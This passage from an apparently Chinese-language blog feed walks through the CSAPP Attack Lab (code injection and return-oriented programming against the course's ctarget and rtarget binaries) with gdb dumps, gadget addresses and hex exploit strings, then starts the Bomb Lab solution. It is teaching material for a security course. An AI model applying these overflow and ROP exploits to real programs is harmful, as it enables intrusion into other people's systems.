class="line">(gdb) disas</div><div class="line">Dump of assembler code for function touch3:</div><div class="line">=&gt; 0x00000000004018fa &lt;+0&gt;:     push   %rbx</div><div class="line">   0x00000000004018fb &lt;+1&gt;:     mov    %rdi,%rbx</div><div class="line">   0x00000000004018fe &lt;+4&gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc &lt;vlevel&gt;</div><div class="line">   0x0000000000401908 &lt;+14&gt;:    mov    %rdi,%rsi</div><div class="line">   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;</div><div class="line">   0x0000000000401911 &lt;+23&gt;:    callq  0x40184c &lt;hexmatch&gt;</div><div class="line">   0x0000000000401916 &lt;+28&gt;:    test   %eax,%eax</div><div class="line">   0x0000000000401918 &lt;+30&gt;:    je     0x40193d &lt;touch3+67&gt;</div><div class="line">   0x000000000040191a &lt;+32&gt;:    mov    %rbx,%rdx</div><div class="line">   0x000000000040191d &lt;+35&gt;:    mov    $0x403138,%esi</div><div class="line">   0x0000000000401922 &lt;+40&gt;:    mov    $0x1,%edi</div><div class="line">   0x0000000000401927 &lt;+45&gt;:    mov    $0x0,%eax</div><div class="line">   0x000000000040192c &lt;+50&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x0000000000401931 &lt;+55&gt;:    mov    $0x3,%edi</div><div class="line">   0x0000000000401936 &lt;+60&gt;:    callq  0x401c8d &lt;validate&gt;</div><div class="line">   0x000000000040193b &lt;+65&gt;:    jmp    0x40195e &lt;touch3+100&gt;</div><div class="line">   0x000000000040193d &lt;+67&gt;:    mov    %rbx,%rdx</div><div class="line">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</div><div class="line">   0x0000000000401940 &lt;+70&gt;:    mov    $0x403160,%esi</div><div class="line">   0x0000000000401945 &lt;+75&gt;:    mov    $0x1,%edi</div><div class="line">   0x000000000040194a &lt;+80&gt;:    mov    $0x0,%eax</div><div class="line">   0x000000000040194f &lt;+85&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x0000000000401954 &lt;+90&gt;:    mov    $0x3,%edi</div><div class="line">   0x0000000000401959 &lt;+95&gt;:    callq  0x401d4f &lt;fail&gt;</div><div class="line">   0x000000000040195e &lt;+100&gt;:   mov    $0x0,%edi</div><div class="line">   0x0000000000401963 &lt;+105&gt;:   callq  0x400e40 &lt;exit@plt&gt;</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
<p>在0x0000000000401916 &lt;+28&gt;:处设置断点，continue后查看缓冲区数据： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">(gdb) break touch3</div><div class="line">Breakpoint 1 at 0x4018fa: file visible.c, line 71.</div><div class="line">(gdb) run</div><div class="line">Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget</div><div class="line">FAILED: Initialization error: Running on an illegal host [minimips-work]</div><div class="line">[Inferior 1 (process 91489) exited with code 010]</div><div class="line">(gdb) run -qi phase3_input.txt</div><div class="line">Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -qi phase3_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, touch3 (sval=0x606010 &quot;\210$\255&quot;, &lt;incomplete sequence \373&gt;)</div><div class="line">    at visible.c:71</div><div class="line">71      visible.c: No such file or directory.</div><div class="line">(gdb) break *0x40190b</div><div class="line">Breakpoint 2 at 0x40190b: file visible.c, line 73.</div><div class="line">(gdb) break *0x401916</div><div class="line">Breakpoint 3 at 0x401916: file visible.c, line 73.</div><div class="line">(gdb) continue</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, 0x000000000040190b in touch3 (</div><div class="line">    sval=0x606010 &quot;\210$\255&quot;, &lt;incomplete sequence \373&gt;) at visible.c:73</div><div class="line">73      in visible.c</div><div class="line"> (gdb) x/20x 0x5561dc78 # 在调用hexmatch之前缓冲区不变</div><div class="line">0x5561dc78:     0x4018fa68      0x0000c300      0x00000000      0x00000000</div><div class="line">0x5561dc88:     0x00000000      0x00000000      0x00000000      0x00000000</div><div class="line">0x5561dc98:     0x00000000      0x00000000      0x55586000      0x00000000</div><div class="line">0x5561dca8:     0x00000009      0x00000000      0x00401f24      0x00000000</div><div class="line">0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4</div><div class="line">(gdb) continue</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 3, 0x0000000000401916 in touch3 (</div><div class="line">    sval=0x606010 &quot;\210$\255&quot;, &lt;incomplete sequence \373&gt;) at visible.c:73</div><div class="line">73      in visible.c</div><div class="line">(gdb) x/20x 0x5561dc78 # 在调用hexmatch之后缓冲区发生改变</div><div class="line">0x5561dc78:     0x6dc03400      0x181c2db5      0x00606010      0x00000000</div><div class="line">0x5561dc88:     0x55685fe8      0x00000000      0x00000003      0x00000000</div><div class="line">0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000</div><div class="line">0x5561dca8:     0x00000009      0x00000000      0x00401f24      0x00000000</div><div class="line">0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4</div></pre></td></tr></table></figure>
<p>观察发现缓冲区被覆盖了，所以不能把Cookie的ASCII码放在缓冲区开头，可以放在0x5561dca8处的0x00401f24之后，有足够的空间存放，最终phase3.txt如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 fa 97 b9 59 68 </div><div class="line">fa 18 40 00 c3 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">35 39 62 39 39 37 66 61 </div><div class="line">78 dc 61 55 00 00 00 00 </div><div class="line">09 00 00 00 00 00 00 00 </div><div class="line">24 1f 40 00 00 00 00 00 </div><div class="line">35 39 62 39 39 37 66 61</div></pre></td></tr></table></figure>
<p>使用如下命令测试，同时查看结果： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase3.txt &gt; phase3_input.txt</div><div class="line">./ctarget -qi phase3_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</div><div class="line">Valid solution for level 3 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 3030 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61</div></pre></td></tr></table></figure>
<p>Level 3通过。 </p>
<h2 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><p>这一部分攻击rtarget程序，但是这个程序使用了两种技术防止代码注入攻击：</p>
<ul>
<li>每次栈的位置是随机的，于是我们没有办法确定需要跳转的地址</li>
<li>即使我们能够找到规律注入代码，但是栈是不可执行的，一旦执行，则会遇到段错误</li>
</ul>
<p>所以只能利用已有的可执行的代码，来完成我们的操作，称为<code>retrun-oriented programming(ROP)</code>，策略就是找到现存代码中的若干条指令，这些指令后面跟着指令ret，每次return相当于从一个gadget跳转到另一个gadget中，然后通过这样不断跳转来完成我们想要的操作。</p>
<h3 id="Level-1-1"><a href="#Level-1-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>这一关要求我们重复上一部分Level 2的攻击，但是无法对rtarget进行代码注入攻击，我们只能使用ROP攻击：利用farm.c中的程序的gadget，构造我们需要的指令，在rtarget中执行，farm段的反汇编代码在下面这一部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0000000000401994 &lt;start_farm&gt;:</div><div class="line">  401994:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line">  401999:	c3                   	retq   </div><div class="line">……</div><div class="line">0000000000401ab2 &lt;end_farm&gt;:</div><div class="line">  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line">  401ab7:	c3                   	retq   </div><div class="line">  401ab8:	90                   	nop</div><div class="line">  401ab9:	90                   	nop</div><div class="line">  401aba:	90                   	nop</div><div class="line">  401abb:	90                   	nop</div><div class="line">  401abc:	90                   	nop</div><div class="line">  401abd:	90                   	nop</div><div class="line">  401abe:	90                   	nop</div><div class="line">  401abf:	90                   	nop</div></pre></td></tr></table></figure>
<p>使用如下几个gadget构造ROP程序： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00000000004019a0 &lt;addval_273&gt;:</div><div class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</div><div class="line">  4019a6:	c3                   	retq   </div><div class="line"></div><div class="line">00000000004019a7 &lt;addval_219&gt;:</div><div class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</div><div class="line">  4019ad:	c3                   	retq</div></pre></td></tr></table></figure>
<p>使用如下地址： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x004017ec # touch2 的入口地址</div><div class="line">0x004019a2 # 48 89 c7 movq %rax, %rdi</div><div class="line">0x59b997fa # My cookie</div><div class="line">0x004019ab # popq %rax</div></pre></td></tr></table></figure>
<p>构造成的phase4.txt如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 </div><div class="line">c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00</div></pre></td></tr></table></figure>
<p>使用如下命令测试，同时查看结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase4.txt &gt; phase4_input.txt</div><div class="line">./rtarget -qi phase4_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution for level 2 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</div></pre></td></tr></table></figure>
<p>Level 1通过。</p>
<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>这一关要求我们重复上一部分Level 3的攻击，使用ROP攻击的形式。</p>
<p>使用如下几个gadget构造ROP程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">0000000000401aab &lt;setval_350&gt;:</div><div class="line">  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)</div><div class="line">  401ab1:	c3                   	retq   </div><div class="line"></div><div class="line">00000000004019d6 &lt;add_xy&gt;:</div><div class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</div><div class="line">  4019da:	c3                   	retq   </div><div class="line"></div><div class="line">00000000004019a0 &lt;addval_273&gt;:</div><div class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</div><div class="line">  4019a6:	c3                   	retq</div></pre></td></tr></table></figure>
<p>使用如下地址： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x00401aad # 48 89 e0 movq %rsp, %rax</div><div class="line">0x004019d8 # 04 37 add %0x37, %al</div><div class="line">0x004019a2 # 48 89 c7 movq %rax, %rdi</div><div class="line">0x004018fa # touch2 的入口地址</div><div class="line">35 39 62 39 39 37 66 61 00 # My cookie ASCII</div></pre></td></tr></table></figure>
<p>构造成的phase5.txt如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">ad 1a 40 00 00 00 00 00 d8 19 40 00 00 00 00 00  </div><div class="line">a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure>
<p>使用如下命令测试，同时查看结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase5.txt &gt; phase5_input.txt</div><div class="line">./rtarget -qi phase5_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</div><div class="line">Valid solution for level 3 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 D8 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure>
<p>Level 2通过。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;p&gt;深入理解计算机系统（CSAPP）的实验三是Attack Lab。实验分为两个部分，分别对应一种攻击方式：代码注入攻击（Code Injection Attacks）和ROP攻击（）。我们的任务是完成五个这两类攻击。&lt;/p&gt;
&lt;p&gt;实验提供了五个文件，其作用如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ctarget：用来做代码注入攻击的程序&lt;/li&gt;
&lt;li&gt;rtarget: 用来做 ROP 攻击的程序 &lt;/li&gt;
&lt;li&gt;cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符 &lt;/li&gt;
&lt;li&gt;farm.c: 用来找寻 gadget 的源文件 &lt;/li&gt;
&lt;li&gt;hex2raw: 用来生成攻击字符串的程序&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="计算机系统" scheme="http://xzjqx.data/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="C/C++" scheme="http://xzjqx.data/tags/C-C/"/>
    
      <category term="CSAPP" scheme="http://xzjqx.data/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统（CSAPP）实验二 Bomb Lab</title>
    <link href="http://xzjqx.data/2018/04/26/bomblab/"/>
    <id>http://xzjqx.data/2018/04/26/bomblab/</id>
    <published>2018-04-26T03:52:57.000Z</published>
    <updated>2018-05-08T03:40:48.374Z</updated>
    
    <content type="html"><![CDATA[<p>深入理解计算机系统（CSAPP）的实验二是Bomb Lab。实验中有六道关卡，我们的任务是通过查看反汇编代码，在程序运行时，从键盘输入六条正确的字符串，才能通过这六道关卡。<br><a id="more"></a></p>
<h2 id="第一关：phase-1"><a href="#第一关：phase-1" class="headerlink" title="第一关：phase_1"></a>第一关：phase_1</h2><p>在Ubuntu终端下通过<code>gdb bomb</code>指令开始调试bomb程序。<br>使用disas指令查看phase_1程序的反汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function phase_1:</div><div class="line">   0x0000000000400ee0 &lt;+0&gt;:	sub    $0x8,%rsp</div><div class="line">   0x0000000000400ee4 &lt;+4&gt;:	mov    $0x402400,%esi</div><div class="line">   0x0000000000400ee9 &lt;+9&gt;:	callq  0x401338 &lt;strings_not_equal&gt;</div><div class="line">   0x0000000000400eee &lt;+14&gt;:	test   %eax,%eax</div><div class="line">   0x0000000000400ef0 &lt;+16&gt;:	je     0x400ef7 &lt;phase_1+23&gt;</div><div class="line">   0x0000000000400ef2 &lt;+18&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x0000000000400ef7 &lt;+23&gt;:	add    $0x8,%rsp</div><div class="line">   0x0000000000400efb &lt;+27&gt;:	retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>从上述反汇编代码中看出<code>phase_1</code>函数调用了<code>strings_not_equal</code>函数和<code>explode_bomb</code>，使用disas指令分辨查看这两个函数的作用，反汇编代码如下：</p>
<p>strings_not_euqal：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function strings_not_equal:</div><div class="line">   0x0000000000401338 &lt;+0&gt;:	push   %r12</div><div class="line">   0x000000000040133a &lt;+2&gt;:	push   %rbp</div><div class="line">   0x000000000040133b &lt;+3&gt;:	push   %rbx</div><div class="line">   0x000000000040133c &lt;+4&gt;:	mov    %rdi,%rbx</div><div class="line">   0x000000000040133f &lt;+7&gt;:	mov    %rsi,%rbp</div><div class="line">   0x0000000000401342 &lt;+10&gt;:	callq  0x40131b &lt;string_length&gt;</div><div class="line">   0x0000000000401347 &lt;+15&gt;:	mov    %eax,%r12d</div><div class="line">   0x000000000040134a &lt;+18&gt;:	mov    %rbp,%rdi</div><div class="line">   0x000000000040134d &lt;+21&gt;:	callq  0x40131b &lt;string_length&gt;</div><div class="line">   0x0000000000401352 &lt;+26&gt;:	mov    $0x1,%edx</div><div class="line">   0x0000000000401357 &lt;+31&gt;:	cmp    %eax,%r12d</div><div class="line">   0x000000000040135a &lt;+34&gt;:	jne    0x40139b &lt;strings_not_equal+99&gt;</div><div class="line">   0x000000000040135c &lt;+36&gt;:	movzbl (%rbx),%eax</div><div class="line">   0x000000000040135f &lt;+39&gt;:	test   %al,%al</div><div class="line">   0x0000000000401361 &lt;+41&gt;:	je     0x401388 &lt;strings_not_equal+80&gt;</div><div class="line">   0x0000000000401363 &lt;+43&gt;:	cmp    0x0(%rbp),%al</div><div class="line">   0x0000000000401366 &lt;+46&gt;:	je     0x401372 &lt;strings_not_equal+58&gt;</div><div class="line">   0x0000000000401368 &lt;+48&gt;:	jmp    0x40138f &lt;strings_not_equal+87&gt;</div><div class="line">   0x000000000040136a &lt;+50&gt;:	cmp    0x0(%rbp),%al</div><div class="line">   0x000000000040136d &lt;+53&gt;:	nopl   (%rax)</div><div class="line">   0x0000000000401370 &lt;+56&gt;:	jne    0x401396 &lt;strings_not_equal+94&gt;</div><div class="line">   0x0000000000401372 &lt;+58&gt;:	add    $0x1,%rbx</div><div class="line">   0x0000000000401376 &lt;+62&gt;:	add    $0x1,%rbp</div><div class="line">   0x000000000040137a &lt;+66&gt;:	movzbl (%rbx),%eax</div><div class="line">   0x000000000040137d &lt;+69&gt;:	test   %al,%al</div><div class="line">   0x000000000040137f &lt;+71&gt;:	jne    0x40136a &lt;strings_not_equal+50&gt;</div><div class="line">   0x0000000000401381 &lt;+73&gt;:	mov    $0x0,%edx</div><div class="line">   0x0000000000401386 &lt;+78&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</div><div class="line">   0x0000000000401388 &lt;+80&gt;:	mov    $0x0,%edx</div><div class="line">   0x000000000040138d &lt;+85&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</div><div class="line">   0x000000000040138f &lt;+87&gt;:	mov    $0x1,%edx</div><div class="line">   0x0000000000401394 &lt;+92&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</div><div class="line">   0x0000000000401396 &lt;+94&gt;:	mov    $0x1,%edx</div><div class="line">   0x000000000040139b &lt;+99&gt;:	mov    %edx,%eax</div><div class="line">   0x000000000040139d &lt;+101&gt;:	pop    %rbx</div><div class="line">   0x000000000040139e &lt;+102&gt;:	pop    %rbp</div><div class="line">   0x000000000040139f &lt;+103&gt;:	pop    %r12</div><div class="line">   0x00000000004013a1 &lt;+105&gt;:	retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>从strings_not_equal函数的反汇编代码可以看出，这个函数有两个输入参数，分别存在rdi和rsi寄存器中，这两个寄存器分别存的是两个字符串的起始地址。函数判断两个字符串是否相等：若相等，则返回参数寄存器eax为0，否则寄存器eax值为1。</p>
<p>explode_bomb：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function explode_bomb:</div><div class="line">   0x000000000040143a &lt;+0&gt;:	sub    $0x8,%rsp</div><div class="line">   0x000000000040143e &lt;+4&gt;:	mov    $0x4025a3,%edi</div><div class="line">   0x0000000000401443 &lt;+9&gt;:	callq  0x400b10 &lt;puts@plt&gt;</div><div class="line">   0x0000000000401448 &lt;+14&gt;:	mov    $0x4025ac,%edi</div><div class="line">   0x000000000040144d &lt;+19&gt;:	callq  0x400b10 &lt;puts@plt&gt;</div><div class="line">   0x0000000000401452 &lt;+24&gt;:	mov    $0x8,%edi</div><div class="line">   0x0000000000401457 &lt;+29&gt;:	callq  0x400c20 &lt;exit@plt&gt;</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>从explode_bomb的反汇编代码不难看出这个函数就是产生boom的函数了，这样我们就知道，后续任务的主要目的就是不让程序进入这个函数即可。</p>
<p>重新回到<code>phase_1</code>函数的反汇编代码，我们就能很容易知道这个函数的任务就是输入一个字符串，与存在地址($0x402400)中的字符串比较，若两个字符串相等则不会产生爆炸（将炸弹拆除）。在gdb中使用<code>x/s 0x402400</code>指令查看该地址对应的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s 0x402400</div><div class="line">0x402400:	&quot;Border relations with Canada have never been better.&quot;</div></pre></td></tr></table></figure></p>
<p>退出gdb，重新运行<code>bomb</code>，第一条输入<code>Border relations with Canada have never been better.</code>得到结果如下，表示第一关已经通过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div></pre></td></tr></table></figure></p>
<h2 id="第二关：phase-2"><a href="#第二关：phase-2" class="headerlink" title="第二关：phase_2"></a>第二关：phase_2</h2><p>同样的方法：首先进入gdb，使用disas指令查看<code>phase_2</code>的反汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function phase_2:</div><div class="line">   0x0000000000400efc &lt;+0&gt;:	push   %rbp</div><div class="line">   0x0000000000400efd &lt;+1&gt;:	push   %rbx</div><div class="line">   0x0000000000400efe &lt;+2&gt;:	sub    $0x28,%rsp</div><div class="line">   0x0000000000400f02 &lt;+6&gt;:	mov    %rsp,%rsi</div><div class="line">   0x0000000000400f05 &lt;+9&gt;:	callq  0x40145c &lt;read_six_numbers&gt;</div><div class="line">   0x0000000000400f0a &lt;+14&gt;:	cmpl   $0x1,(%rsp)</div><div class="line">   0x0000000000400f0e &lt;+18&gt;:	je     0x400f30 &lt;phase_2+52&gt;</div><div class="line">   0x0000000000400f10 &lt;+20&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x0000000000400f15 &lt;+25&gt;:	jmp    0x400f30 &lt;phase_2+52&gt;</div><div class="line">   0x0000000000400f17 &lt;+27&gt;:	mov    -0x4(%rbx),%eax</div><div class="line">   0x0000000000400f1a &lt;+30&gt;:	add    %eax,%eax</div><div class="line">   0x0000000000400f1c &lt;+32&gt;:	cmp    %eax,(%rbx)</div><div class="line">   0x0000000000400f1e &lt;+34&gt;:	je     0x400f25 &lt;phase_2+41&gt;</div><div class="line">   0x0000000000400f20 &lt;+36&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x0000000000400f25 &lt;+41&gt;:	add    $0x4,%rbx</div><div class="line">   0x0000000000400f29 &lt;+45&gt;:	cmp    %rbp,%rbx</div><div class="line">   0x0000000000400f2c &lt;+48&gt;:	jne    0x400f17 &lt;phase_2+27&gt;</div><div class="line">   0x0000000000400f2e &lt;+50&gt;:	jmp    0x400f3c &lt;phase_2+64&gt;</div><div class="line">   0x0000000000400f30 &lt;+52&gt;:	lea    0x4(%rsp),%rbx</div><div class="line">   0x0000000000400f35 &lt;+57&gt;:	lea    0x18(%rsp),%rbp</div><div class="line">   0x0000000000400f3a &lt;+62&gt;:	jmp    0x400f17 &lt;phase_2+27&gt;</div><div class="line">   0x0000000000400f3c &lt;+64&gt;:	add    $0x28,%rsp</div><div class="line">   0x0000000000400f40 &lt;+68&gt;:	pop    %rbx</div><div class="line">   